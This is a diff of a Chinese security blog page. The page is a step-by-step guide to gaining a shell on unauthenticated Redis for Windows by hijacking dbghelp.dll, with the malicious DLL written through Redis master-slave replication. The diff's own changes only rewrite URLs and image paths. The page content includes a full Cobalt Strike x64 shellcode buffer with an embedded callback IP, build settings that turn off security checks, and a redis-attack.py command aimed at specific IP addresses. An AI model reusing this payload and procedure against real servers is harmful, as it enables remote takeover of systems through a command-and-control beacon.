@@ -30,29 +30,29 @@
     <meta name="description" content="总：Redis在Windows环境下Getshell方法小结-腾讯云开发者社区-腾讯云 这里暂且先提一下DLL劫持上线CS  Windows环境Redis DLL劫持上线CS  利用原理 参考文章： Windows中redis未授权通过dll劫持上线 - 我要变超人 - 博客园 Windows Redis DLL劫持在实战中的利用-先知社区  DLL劫持原理 DLL：Windows的动态链接库，简">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Windows环境Redis未授权访问漏洞利用">
-<meta property="og:url" content="http://example.com/2026/01/15/Windows%E7%8E%AF%E5%A2%83Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:url" content="https://fub0y2026.github.io/2026/01/15/Windows%E7%8E%AF%E5%A2%83Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.html">
 <meta property="og:site_name" content="KL">
 <meta property="og:description" content="总：Redis在Windows环境下Getshell方法小结-腾讯云开发者社区-腾讯云 这里暂且先提一下DLL劫持上线CS  Windows环境Redis DLL劫持上线CS  利用原理 参考文章： Windows中redis未授权通过dll劫持上线 - 我要变超人 - 博客园 Windows Redis DLL劫持在实战中的利用-先知社区  DLL劫持原理 DLL：Windows的动态链接库，简">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2026/01/15/images/image-20260115005750973.png">
-<meta property="og:image" content="http://example.com/2026/01/15/images/image-20260115010011449.png">
-<meta property="og:image" content="http://example.com/2026/01/15/images/image-20260115010214874.png">
-<meta property="og:image" content="http://example.com/2026/01/15/images/image-20260115010313680.png">
-<meta property="og:image" content="http://example.com/2026/01/15/images/image-20260115011844863.png">
-<meta property="og:image" content="http://example.com/2026/01/15/images/image-20260115013502377.png">
-<meta property="og:image" content="http://example.com/2026/01/15/images/image-20260115013540109.png">
-<meta property="og:image" content="http://example.com/2026/01/15/images/image-20260115013614283.png">
-<meta property="og:image" content="http://example.com/2026/01/15/images/image-20260115014205538.png">
-<meta property="og:image" content="http://example.com/2026/01/15/images/image-20260115014330646.png">
-<meta property="og:image" content="http://example.com/2026/01/15/images/image-20260115123202073.png">
-<meta property="og:image" content="http://example.com/2026/01/15/images/image-20260115124231676.png">
-<meta property="og:image" content="http://example.com/2026/01/15/images/image-20260115124535830.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20260115005750973.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20260115010011449.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20260115010214874.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20260115010313680.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20260115011844863.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20260115013502377.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20260115013540109.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20260115013614283.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20260115014205538.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20260115014330646.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20260115123202073.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20260115124231676.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20260115124535830.png">
 <meta property="article:published_time" content="2026-01-15T04:55:27.000Z">
 <meta property="article:modified_time" content="2026-01-15T04:59:47.278Z">
 <meta property="article:author" content="FuB0Y">
 <meta property="article:tag" content="Redis未授权访问">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2026/01/15/images/image-20260115005750973.png">
+<meta name="twitter:image" content="https://fub0y2026.github.io/images/image-20260115005750973.png">
   
   
     <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
@@ -349,10 +349,10 @@ DLL劫持：当程序没有指定DLL的绝对路径时，就会按一定顺序�
 <p>例如，假设有一个应用程序叫做<code>&quot;example.exe</code>&quot;，它依赖于名为&quot;<code>example.dll</code>&quot;的动态链接库。而&quot;example.exe&quot;在加载&quot;example.dll&quot;时没有使用绝对路径，而是仅仅指定了DLL的名称。攻击者可以将恶意的&quot;example.dll&quot;文件放置在与&quot;example.exe&quot;相同的目录下，当&quot;example.exe&quot;启动时，系统会先在当前目录中查找&quot;example.dll&quot;文件，如果找到，就会加载该文件并执行其中的恶意代码。</p>
 </blockquote>
 <p>DLL劫持可以函数转发劫持也可以往完整DLL插入恶意代码，这里用的函数转发劫持，大致流程如下图所示：</p>
-<p><img src="../images/image-20260115005750973.png" alt="image-20260115005750973" /></p>
+<p><img src="/images/image-20260115005750973.png" alt="image-20260115005750973" /></p>
 <h4 id="劫持dbghelpdll"><a class="markdownIt-Anchor" href="#劫持dbghelpdll"></a> 劫持dbghelp.dll</h4>
 <p>redis-server.exe在执行bgsave时，会先在应用目录查找dbghelp.dll，找不到再去system32目录下找：</p>
-<p><img src="../images/image-20260115010011449.png" alt="image-20260115010011449" /></p>
+<p><img src="/images/image-20260115010011449.png" alt="image-20260115010011449" /></p>
 <p>而不管redis的权限是Administrator还是普通用户或者Network Service，它对自己的应用目录一定有写文件的权限，我们可以通过Redis的主从复制在应用目录里写入恶意DLL。</p>
 <h4 id="函数转发劫持"><a class="markdownIt-Anchor" href="#函数转发劫持"></a> 函数转发劫持</h4>
 <p>对DLL进行函数转发劫持需要导出原本DLL的函数和地址，以保证程序通过恶意DLL调用这些函数时不影响正常功能，DLL的导出函数一般</p>
@@ -366,34 +366,34 @@ DLL劫持：当程序没有指定DLL的绝对路径时，就会按一定顺序�
 <p>（3）生成C/C++代码时，没有使用目标DLL的绝对路径，只是用了DLL的名字填充<code>LoadLibrary()</code>，这是一个很严重的bug，会导致函数</p>
 <p>转发失败、Redis的功能受到影响从而只能劫持一次：</p>
 <p>修复：我改成了根据输入的目标DLL路径自动填充。</p>
-<p><img src="../images/image-20260115010214874.png" alt="image-20260115010214874" /></p>
+<p><img src="/images/image-20260115010214874.png" alt="image-20260115010214874" /></p>
 <p>正常的DLL转发劫持如下，调用完应用程序目录里的恶意DLL后会调用原DLL：</p>
-<p><img src="../images/image-20260115010313680.png" alt="image-20260115010313680" /></p>
+<p><img src="/images/image-20260115010313680.png" alt="image-20260115010313680" /></p>
 <h3 id="攻击"><a class="markdownIt-Anchor" href="#攻击"></a> 攻击</h3>
 <p>从本地的<strong>system32</strong>文件夹下提取出 <code>dbghelp.dll</code>，然后使用 <a target="_blank" rel="noopener" href="https://github.com/JKme/sb_kiddie-/blob/master/hacking_win/dll_hijack/DLLHijacker.py">dllHijack</a> 脚本，</p>
 <p>用脚本生成<strong>dbghelp.dll</strong> 的Visual Studio 2019的项目文件</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 DllHijacker.py dbghelp.dll </span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>如是是Windows 64位的Redis DLL劫持的话，可以直接用里面的VS2022版的dbghelp项目</p>
-<p><img src="../images/image-20260115011844863.png" alt="image-20260115011844863" /></p>
+<p><img src="/images/image-20260115011844863.png" alt="image-20260115011844863" /></p>
 </blockquote>
-<p><img src="../images/image-20260115013502377.png" alt="image-20260115013502377" /></p>
+<p><img src="/images/image-20260115013502377.png" alt="image-20260115013502377" /></p>
 <p>生成</p>
-<p><img src="../images/image-20260115013540109.png" alt="image-20260115013540109" /></p>
+<p><img src="/images/image-20260115013540109.png" alt="image-20260115013540109" /></p>
 <p>打开生成目录里的sln文件，因为原本是VS2019的项目所以会提醒你升级，选确定，不然得另外安装v142的编译组件才能编译VS2019的项目：</p>
-<p><img src="../images/image-20260115013614283.png" alt="image-20260115013614283" /></p>
+<p><img src="/images/image-20260115013614283.png" alt="image-20260115013614283" /></p>
 <p>然后选中项目设置属性：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">***********************重点***********************</span><br><span class="line">请在VS2019中修改项目的属性如果不改，那么靶机无法加载生成出来的DLL</span><br><span class="line">属性-&gt;C/C++-&gt;代码生成-&gt;运行库-&gt;多线程 (/MT)如果是debug则设置成MTD  </span><br><span class="line">属性-&gt;C/C++-&gt;代码生成-&gt;禁用安全检查GS</span><br><span class="line">关闭生成清单 属性-&gt;链接器-&gt;清单文件-&gt;生成清单 选择否</span><br></pre></td></tr></table></figure>
-<p><img src="../images/image-20260115014205538.png" alt="image-20260115014205538" /></p>
-<p><img src="../images/image-20260115014330646.png" alt="image-20260115014330646" /></p>
+<p><img src="/images/image-20260115014205538.png" alt="image-20260115014205538" /></p>
+<p><img src="/images/image-20260115014330646.png" alt="image-20260115014330646" /></p>
 <p>然后用VPS启动CS，生成一个payload</p>
-<p><img src="../images/image-20260115123202073.png" alt="image-20260115123202073" /></p>
+<p><img src="/images/image-20260115123202073.png" alt="image-20260115123202073" /></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* length: 891 bytes */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\xb8\x22\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4a\x7a\x49\x50\x00\x31\xaa\xc3\xa0\xa2\xf8\x2e\x8e\xdc\xef\x40\x82\xc4\x05\xe7\x7c\x13\x6b\xde\xd7\xd5\x1b\x90\x13\xb4\x1b\x90\x58\x3b\x2d\x9d\x2a\x08\x03\xbc\x35\xbd\xf4\x9c\x6e\xeb\xa2\x94\x4b\xc1\xfb\x24\x7c\x14\x5d\xf4\x51\x78\xce\xe2\x19\x64\xbe\x08\xc2\x85\x82\x6e\xd2\xde\x8a\xe9\xa3\xc0\x0a\x4a\xa0\xe5\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x49\x4e\x29\x0d\x0a\x00\x24\x3b\x1d\x42\x86\x09\x09\x8f\x21\xd5\x63\xfa\x17\x24\xd5\x32\x6b\xdb\x6e\x64\xe7\x1d\x37\x4d\x87\xa4\x28\x9c\x42\x29\x68\x16\x3e\x47\x4f\x27\xa4\x0b\x26\xfe\xf6\x8a\x5e\x56\xd8\xd0\x92\x56\xf6\x5d\x31\xe5\xd1\x6e\x7d\x41\x7e\xab\xa8\xfc\x82\x20\xad\x3e\x68\x23\xea\x12\x5d\x03\x65\x3f\xc1\xb3\x38\x0b\xa8\x8f\x12\x03\x44\x1e\x9a\x36\xa3\xc0\x47\x33\x08\x8d\xb8\x82\x8e\x86\x37\xba\x4d\x1c\xd1\x53\x10\x0f\xe2\x99\x3a\xd7\xee\xe0\x82\xc8\xfd\xda\xaf\x67\x34\x91\x7f\xb0\xc9\x6e\xe3\xe2\xb5\x65\x85\xdc\x67\x86\xab\x0a\xa4\xfd\x4b\xbe\x73\x1c\xde\x2b\x1a\x2c\x6a\x6e\xed\x7f\xd0\xde\x60\x08\x8b\x92\xde\xb8\xec\xdf\x6d\xac\xdd\x85\xf2\x42\x1b\xe1\xf3\x3a\xac\xaf\x0d\xdd\x3c\xab\x5b\x65\x34\x4e\x45\x63\x80\x29\x90\x1c\x9d\x53\x18\xa5\x5b\x15\x97\x6c\x37\x82\x6a\x7b\x71\xbd\x85\xfb\x7a\x7a\x84\xb0\x43\x65\xed\xf4\xed\x06\xf0\xe3\x25\x16\x1f\x52\xb9\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x38\x2e\x31\x34\x38\x2e\x32\x31\x31\x2e\x34\x37\x00\x17\x50\x65\xea&quot;</span>;</span><br></pre></td></tr></table></figure>
 <p>在源文件的dllmain.app里把payload替换进去，然后选Release x64，生成——生成解决方案：</p>
-<p><img src="../images/image-20260115124231676.png" alt="image-20260115124231676" /></p>
+<p><img src="/images/image-20260115124231676.png" alt="image-20260115124231676" /></p>
 <p>然后这里有几种方法：<br />
 <strong>1、直接主从复制漏洞把文件写进去：</strong><br />
-<img src="../images/image-20260115124535830.png" alt="image-20260115124535830" /></p>
+<img src="/images/image-20260115124535830.png" alt="image-20260115124535830" /></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-attack.py -r 39.99.225.243 -L 116.62.50.188 -wf dbghelp.dll</span><br></pre></td></tr></table></figure>
 <p>然后再连接并bgsave</p>
 <p><strong>2、用RedisWriteFile脚本写进去（利用的也是主从复制漏洞）</strong></p>
@@ -429,7 +429,7 @@ DLL劫持：当程序没有指定DLL的绝对路径时，就会按一定顺序�
         
           
           
-            <img data-src="/images/175514388679175514388612.jpg" data-sizes="auto" alt="[Vulnhub靶机通关]DC-2" class="lazyload">
+            <img data-src="/images/126839103p0master1200.jpg" data-sizes="auto" alt="[Vulnhub靶机通关]DC-2" class="lazyload">
           
         
         <a href="/2026/01/25/%5BVulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%5DDC-2/"></a>
@@ -446,7 +446,7 @@ DLL劫持：当程序没有指定DLL的绝对路径时，就会按一定顺序�
       
         
         
-          <img data-src="/images/17369576223624.jpg" data-sizes="auto" alt="面经" class="lazyload">
+          <img data-src="/images/124691006_p0_master1200.jpg" data-sizes="auto" alt="面经" class="lazyload">
         
       
       <a href="/2026/01/06/%E9%9D%A2%E7%BB%8F/"></a>
@@ -671,7 +671,7 @@ DLL劫持：当程序没有指定DLL的绝对路径时，就会按一定顺序�
         window.REIMU_POST = {
           author: "FuB0Y",
           title: "Windows环境Redis未授权访问漏洞利用",
-          url: "http://example.com/2026/01/15/Windows%E7%8E%AF%E5%A2%83Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/",
+          url: "https://fub0y2026.github.io/2026/01/15/Windows%E7%8E%AF%E5%A2%83Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/",
           excerpt: "",
           description: "",
           stripContent: "总：Redis在Windows环境下Getshell方法小结-腾讯云开发者社区-腾讯云 这里暂且先提一下DLL劫持上线CS  Windows环境Redis DLL劫持上线CS  利用原理 参考文章： Windows中redis未授权通过dll劫持上线 - 我要变超人 - 博客园 Windows Redis DLL劫持在实战中的利用-先知社区  DLL劫持原理 DLL：Windows的动态链接库，简单来说，就是一部分Windows平台下的通用代码并没有写在程序里，而是当程序需要使用时去DLL里调用",
